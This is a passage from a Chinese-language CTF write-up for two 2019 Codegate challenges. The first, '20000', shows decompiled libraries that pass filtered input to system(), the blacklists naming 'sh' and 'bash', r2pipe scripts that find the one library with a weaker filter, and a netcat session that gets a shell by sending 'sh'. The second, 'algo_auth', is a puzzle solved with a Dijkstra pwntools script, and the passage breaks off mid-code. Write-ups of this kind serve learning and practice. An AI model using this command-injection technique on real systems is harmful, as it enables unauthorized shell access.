*))dlsym(handle, <span class="string">"filter1"</span>);</span><br><span class="line">    v6 = dlopen(<span class="string">"./20000_so/lib_2850.so"</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v6 )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = (<span class="keyword">void</span> (__fastcall *)(<span class="keyword">char</span> *))dlsym(v6, <span class="string">"filter2"</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"This is lib_1139 file."</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"How do you find vulnerable file?"</span>);</span><br><span class="line">      read(<span class="number">0</span>, &amp;buf, <span class="number">0x32</span>uLL);</span><br><span class="line">      v3(&amp;buf, &amp;buf);</span><br><span class="line">      v4(&amp;buf);</span><br><span class="line">      <span class="built_in">sprintf</span>(&amp;s, <span class="string">"ls \"%s\""</span>, &amp;buf);</span><br><span class="line">      system(&amp;s);</span><br><span class="line">      dlclose(handle);</span><br><span class="line">      dlclose(v6);</span><br><span class="line">      result = <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v2 = dlerror();</span><br><span class="line">      <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Error: %s\n"</span>, v2);</span><br><span class="line">      result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v0 = dlerror();</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Error: %s\n"</span>, v0);</span><br><span class="line">    result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到是读取输入作为参数来执行<code>ls</code>命令。在<code>lib_12071.so</code>里找到一个<code>filter1()</code>函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *__<span class="function">fastcall <span class="title">filter1</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="string">';'</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="string">'*'</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="string">'|'</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="string">'&amp;'</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="string">'$'</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="string">'`'</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="string">'&gt;'</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="string">'&lt;'</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  result = <span class="built_in">strchr</span>(a1, <span class="string">'r'</span>);</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤了一些字符。在<code>lib_9494.so</code>中还有一个<code>filter2()</code>函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *__<span class="function">fastcall <span class="title">filter2</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="string">'v'</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="string">'m'</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="string">'p'</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="string">'d'</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="string">'n'</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strstr</span>(a1, <span class="string">"bin"</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strstr</span>(a1, <span class="string">"sh"</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strstr</span>(a1, <span class="string">"bash"</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="string">'f'</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="string">'l'</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  result = <span class="built_in">strchr</span>(a1, <span class="string">'g'</span>);</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也是过滤了一些字符，还有<code>bash</code>和<code>sh</code>这些字串。那么基本可以确认所有的<code>.so</code>文件必定只包含着三个标志。接下来主要是分析<code>.so</code>文件中的这三个symbol：<code>test</code>、<code>filter1</code>、<code>filter2</code>。<code>test</code>是main函数中会调用的，filter则是在一些文件的<code>test()</code>中会调用，其中<code>filter2()</code>显然是最关键的一个地方。用<a href="https://github.com/radare/radare2-r2pipe" target="_blank" rel="noopener">r2pipe</a>来对文件进行分析（<a href="https://stackoverrun.com/cn/q/12470406" target="_blank" rel="noopener">安装方法</a>）：</p><p>首先遍历每个文件，查找其中的符号并加入到列表中：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> r2pipe</span><br><span class="line"></span><br><span class="line">test = []</span><br><span class="line">filter1 = []</span><br><span class="line">filter2 = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">20000</span>+<span class="number">1</span>):</span><br><span class="line">  <span class="keyword">print</span> i</span><br><span class="line">  r2 = r2pipe.open(<span class="string">'./20000_so/lib_&#123;&#125;.so'</span>.format(i))</span><br><span class="line">  <span class="keyword">if</span> <span class="string">'dlopen'</span> <span class="keyword">in</span> r2.cmd(<span class="string">'ii'</span>):</span><br><span class="line">    test.append(i)</span><br><span class="line">  <span class="keyword">if</span> <span class="string">'filter1'</span> <span class="keyword">in</span> r2.cmd(<span class="string">'is'</span>):</span><br><span class="line">    filter1.append(i)</span><br><span class="line">  <span class="keyword">if</span> <span class="string">'filter2'</span> <span class="keyword">in</span> r2.cmd(<span class="string">'is'</span>):</span><br><span class="line">    filter2.append(i)</span><br><span class="line">  r2.quit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> test</span><br><span class="line"><span class="keyword">print</span> filter1</span><br><span class="line"><span class="keyword">print</span> filter2</span><br></pre></td></tr></table></figure><p>先查找一下filter1每个文件的symbol是否有不同的地方：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> filter1:</span><br><span class="line">  r2 = r2pipe.open(<span class="string">'./20000_so/lib_&#123;&#125;.so'</span>.format(i))</span><br><span class="line">  r2.cmd(<span class="string">'aaa'</span>)</span><br><span class="line">  keys = [<span class="string">'0x3b'</span>, <span class="string">'0x2a'</span>, <span class="string">'0x7c'</span>, <span class="string">'0x26'</span>, <span class="string">'0x24'</span>, <span class="string">'0x60'</span>, <span class="string">'0x3e'</span>, <span class="string">'0x3c'</span>, <span class="string">'0x72'</span>]</span><br><span class="line">  out = r2.cmd(<span class="string">'pdf @ sym.filter1'</span>)</span><br><span class="line">  res = []</span><br><span class="line"></span><br><span class="line">  same = <span class="keyword">True</span></span><br><span class="line">  <span class="keyword">for</span> k <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">if</span> k <span class="keyword">not</span> <span class="keyword">in</span> out:</span><br><span class="line">      same = <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> <span class="keyword">not</span> same:</span><br><span class="line">    res.append(i)</span><br><span class="line">    <span class="keyword">print</span> str(i)</span><br><span class="line"></span><br><span class="line">  r2.quit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'res: '</span>, res</span><br></pre></td></tr></table></figure><p><code>lib_4323.so</code>中的filter1，与之前相比少过滤了一个<code>|</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *__<span class="function">fastcall <span class="title">filter1</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="string">';'</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="string">'*'</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="string">'`'</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="string">'&amp;'</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="string">'$'</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="string">'&gt;'</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strchr</span>(a1, <span class="string">'&lt;'</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  result = <span class="built_in">strchr</span>(a1, <span class="string">'r'</span>);</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来在test中找一下用了这个filter的<code>.so</code>文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> test:</span><br><span class="line">  r2 = r2pipe.open(<span class="string">'./20000_so/lib_&#123;&#125;.so'</span>.format(i))</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> r2.cmd(<span class="string">'iz~./20000_so/lib_4323.so'</span>) != <span class="string">''</span>:</span><br><span class="line">    <span class="keyword">print</span> i</span><br><span class="line"></span><br><span class="line">  r2.quit()</span><br></pre></td></tr></table></figure><p>最后筛选出<code>lib_17394.so</code>，发现其中有：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sprintf</span>(&amp;s, <span class="string">"%s 2 &gt; /dev/null"</span>, &amp;buf, v4);</span><br><span class="line">system(&amp;s);</span><br></pre></td></tr></table></figure><p>直接送一个sh上去就能拿到shell了：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> qianfei @ qianfeideMacBook-Air in ~/Desktop/2019-codegate/20000 [12:41:06] </span><br><span class="line"><span class="meta">$</span> nc 110.10.147.106 15959</span><br><span class="line"></span><br><span class="line">   /$$$$$$   /$$$$$$   /$$$$$$   /$$$$$$   /$$$$$$  </span><br><span class="line">  /$$__  $$ /$$$_  $$ /$$$_  $$ /$$$_  $$ /$$$_  $$ </span><br><span class="line"> |__/  \ $$| $$$$\ $$| $$$$\ $$| $$$$\ $$| $$$$\ $$ </span><br><span class="line">   /$$$$$$/| $$ $$ $$| $$ $$ $$| $$ $$ $$| $$ $$ $$ </span><br><span class="line">  /$$____/ | $$\ $$$$| $$\ $$$$| $$\ $$$$| $$\ $$$$ </span><br><span class="line"> | $$      | $$ \ $$$| $$ \ $$$| $$ \ $$$| $$ \ $$$ </span><br><span class="line"> | $$$$$$$$|  $$$$$$/|  $$$$$$/|  $$$$$$/|  $$$$$$/ </span><br><span class="line"> |________/ \______/  \______/  \______/  \______/  </span><br><span class="line"></span><br><span class="line">INPUT : 17394</span><br><span class="line">This is lib_17394 file.</span><br><span class="line">How do you find vulnerable file?</span><br><span class="line">sh</span><br><span class="line">ls</span><br><span class="line">20000</span><br><span class="line">20000_so</span><br><span class="line">20000_so.tar.gz</span><br><span class="line">flag</span><br><span class="line">cat flag</span><br><span class="line">flag&#123;Are_y0u_A_h@cker_in_real-word?&#125;</span><br></pre></td></tr></table></figure><h1 id="algo-auth"><a href="#algo-auth" class="headerlink" title="algo_auth"></a>algo_auth</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> nc 110.10.147.104 15712 </span><br><span class="line">==&gt; Hi, I like an algorithm. So, i make a new authentication system.</span><br><span class="line">==&gt; It has a total of 100 stages.</span><br><span class="line">==&gt; Each stage gives a 7 by 7 matrix below sample.</span><br><span class="line">==&gt; Find the smallest path sum in matrix, </span><br><span class="line">    by starting in any cell in the left column and finishing in any cell in the right column, </span><br><span class="line">    and only moving up, down, and right.</span><br><span class="line">==&gt; The answer for the sample matrix is 12.</span><br><span class="line">==&gt; If you clear the entire stage, you will be able to authenticate.</span><br><span class="line"></span><br><span class="line">[sample]</span><br><span class="line">99 99 99 99 99 99 99 </span><br><span class="line">99 99 99 99 99 99 99 </span><br><span class="line">99 99 99 99 99 99 99 </span><br><span class="line">99 99 99 99 99 99 99 </span><br><span class="line">99  1  1  1 99  1  1 </span><br><span class="line"> 1  1 99  1 99  1 99 </span><br><span class="line">99 99 99  1  1  1 99 </span><br><span class="line"></span><br><span class="line">If you want to start, type the G key within 10 seconds....&gt;&gt; G</span><br><span class="line"></span><br><span class="line">*** STAGE 1 ***</span><br><span class="line">18 17 16 15 14 13 12 </span><br><span class="line"> 9 11 13 15 17 19 21 </span><br><span class="line">18 17 16 15 14 13 12 </span><br><span class="line">14 16 18 20 22 24 26 </span><br><span class="line">16 15 14 13 12 11 10 </span><br><span class="line"> 6  8 10 12 14 16 18 </span><br><span class="line">22 21 20 19 18 17 16 </span><br><span class="line"></span><br><span class="line">Answer within 10 seconds &gt;&gt;&gt; 1</span><br><span class="line">wrong!! Try again!!</span><br></pre></td></tr></table></figure><p>一道ppc，在7*7的矩阵中寻找从最左列到最右列的最短路。分别在<a href="https://blog.csdn.net/u010376788/article/details/49764205" target="_blank" rel="noopener">csdn</a>和<a href="https://www.geeksforgeeks.org/dijkstras-shortest-path-algorithm-greedy-algo-7/" target="_blank" rel="noopener">geeksforgeeks</a>上找到dijkstra实现的寻找矩阵最短路。回答完100道题目之后，会告诉你<code>@@@@@ Congratz! Your answers are an answer</code>，尝试将所有的答案转ascii，得到base64后的flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment"># p = remote('110.10.147.104', 15712)</span></span><br><span class="line">p = remote(<span class="string">'110.10.147.109'</span>, <span class="number">15712</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'If you want to start, type the G key within 10 seconds....&gt;&gt;'</span>, <span class="string">'G'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">minDistance</span><span class="params">(distances, sptSet, dimension)</span>:</span></span><br><span class="line">    min_ = np.inf</span><br><span class="line">    min_index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(dimension):</span><br><span class="line">        <span class="keyword">if</span> sptSet[i] == <span class="keyword">False</span> <span class="keyword">and</span> distances[i] &lt; min_:</span><br><span class="line">            min_ = distances[i]</span><br><span class="line">            min_index = i</span><br><span class="line">    <span class="keyword">return</span> min_index</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dijkstra</span><span class="params">(graph, source, dimension)</span>:</span> </span><br><span class="line">    sptSet = []</span><br><span class="line">    distances = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(dimension):</span><br><span class="line">        distances.append(np.inf)</span><br><span class="line">        sptSet.append(<span class="keyword">False</span>)</span><br><span class="line">    distances[source] = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(dimension):</span><br><span class="line">        u = minDistance(distances, sptSet, dimension)</span><br><span class="line">        sptSet[u] = <span class="keyword">True</span></span><br><span class="line">        <span class="keyword">for</span> v <span class="keyword">in</span> range(dimension):</span><br><span class="line">            <span class="keyword">if</span> sptSet[v] == <span class="keyword">False</span> <span class="keyword">and</span> graph[u][v] &gt; <span class="number">0</span> <span class="keyword">and</span> distances[u] + graph[u][v] &lt; distances[v]:</span><br><span class="line">                distances[v] = distances[u] + graph[u][v]</span><br><span class="line">    <span class="comment"># print distances</span></span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">8</span>):</span><br><span class="line">        res.append(distances[i * <span class="number">7</span> - <span class="number">1</span>])</span><br><span class="line">    <span class="keyword">print</span> res</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xy2num</span><span class="params">(x, y)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> x &lt; <span class="number">0</span> <span class="keyword">or</span> x &gt;= <span class="number">7</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">    <span class="keyword">if</span> y &lt; <span class="number">0</span> <span class="keyword">or</span> y &gt;= <span class="number">7</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">    <span class="keyword">return</span> y * <span class="number">7</span> + x</span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    p.recvuntil(<span class="string">'*** STAGE &#123;&#125; ***\n'</span>.format(str(i + <span class="number">1</span>)))</span><br><span class="line">    matrix = []</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">        t = p.recvline()[:<span class="number">-1</span>]</span><br><span class="line">        row = []</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> range(len(t) / <span class="number">3</span>):</span><br><span class="line">            <span class="comment"># print type(t[3*k:3*(k+1)].strip(' '))</span></span><br><span class="line">            row.append(int(t[<span class="number">3</span>*k:<span class="number">3</span>*(k+<span class="number">1</span>)].strip(<span class="string">' '</span>)))</span><br><span class="line">        matrix.append(row)</span><br><span class="line">    <span class="comment"># print matrix</span></span><br><span class="line">    min_length = np.inf</span><br><span class="line">    adj = []</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">            t = [<span class="number">0</span>] * (<span class="number">7</span> * <span class="number">7</span>)</span><br><span class="line">            <span class="keyword">if</span> xy2num(x - <span class="number">1</span>, y) &gt;= <span class="number">0</span>:</span><br><span class="line">                t[xy2num(x - <span class="number">1</span>, y)] = matrix[y][x - <span class="number">1</span>]</span><br><span class="line">            <span class="keyword">if</span> xy2num(x + <span class="number">1</span>, y) &gt;= <span class="number">0</span>:</span><br><span class="line">                t[xy2num(x + <span class="number">1</span>, y)] = matrix[y][x + <span class="number">1</span>]</span><br><span class="line">            <span class="keyword">if</span> xy2num(x, y - <span class="number">1</span>) &gt;= <span class="number">0</span>:</span><br><span class="line">                t[xy2num(x, y - <span class="number">1</span>)] = matrix[y - <span class="number">1</span>][x]</span><br><span class="line">            <span class="keyword">if</span> xy2num(x, y + <span class="number">1</span>) &gt;= <span class="number">0</span>:</span><br><span class="line">                t[xy2num(x, y + <span class="number">1</span>)] = matrix[y + <span class="number">1</span>][x]</span><br><span class="line">            adj.append(t)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">        tmp = min(dijkstra(adj, j * <span class="number">7</span>, <span class="number">7</span> * <span class="number">7</span>))</span><br><span class="line">        tmp += matrix[j][<span class="number">0</span>]</span><br><span class="line">        min_length = min(min_length, tmp)</span><br><span class="line">    flag += chr(min_length)</span><br><span class="line">    payload = str(min_length)</span><br><span class="line">    p.sendlineafter(<span class="string">'Answer within 10 seconds &gt;&gt;&gt;'</span>, payload)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'flag:'</span>, base64.b64decode(flag)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>还有另一种做法代码更简短一点就是用背包：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 